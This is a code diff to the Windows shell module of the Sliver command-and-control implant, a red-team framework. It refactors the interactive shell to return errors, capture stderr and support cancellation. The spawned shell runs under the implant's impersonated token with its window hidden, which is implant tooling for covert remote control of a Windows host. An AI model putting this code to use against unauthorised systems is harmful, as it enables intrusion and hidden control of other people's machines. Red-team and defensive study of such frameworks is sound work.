@@ -23,6 +23,7 @@ import (
 	"log"
 	// {{end}}
 
+	"context"
 	"github.com/bishopfox/sliver/implant/sliver/priv"
 	"golang.org/x/sys/windows"
 	"os/exec"
@@ -61,28 +62,56 @@ func Start(command string) error {
 }
 
 // StartInteractive - Start a shell
-func StartInteractive(tunnelID uint64, command []string, _ bool) *Shell {
+func StartInteractive(tunnelID uint64, command []string, _ bool) (*Shell, error) {
 	return pipedShell(tunnelID, command)
 }
 
-func pipedShell(tunnelID uint64, command []string) *Shell {
+func pipedShell(tunnelID uint64, command []string) (*Shell, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[shell] %s", command)
 	// {{end}}
 
-	var cmd *exec.Cmd
-	cmd = exec.Command(command[0], command[1:]...)
+	ctx, cancel := context.WithCancel(context.Background())
+
+	cmd := exec.CommandContext(ctx, command[0], command[1:]...)
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token:      syscall.Token(priv.CurrentToken),
 		HideWindow: true,
 	}
-	stdin, _ := cmd.StdinPipe()
-	stdout, _ := cmd.StdoutPipe()
+	stdin, err := cmd.StdinPipe()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[shell] stdin pipe failed\n")
+		// {{end}}
+		cancel()
+		return nil, err
+	}
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[shell] stdout pipe failed\n")
+		// {{end}}
+		cancel()
+		return nil, err
+	}
+
+	stderr, err := cmd.StderrPipe()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[shell] stderr pipe failed\n")
+		// {{end}}
+		cancel()
+		return nil, err
+	}
+
+	err = cmd.Start()
 
 	return &Shell{
 		ID:      tunnelID,
 		Command: cmd,
 		Stdout:  stdout,
 		Stdin:   stdin,
-	}
+		Stderr:  stderr,
+		Cancel:  cancel,
+	}, err
 }
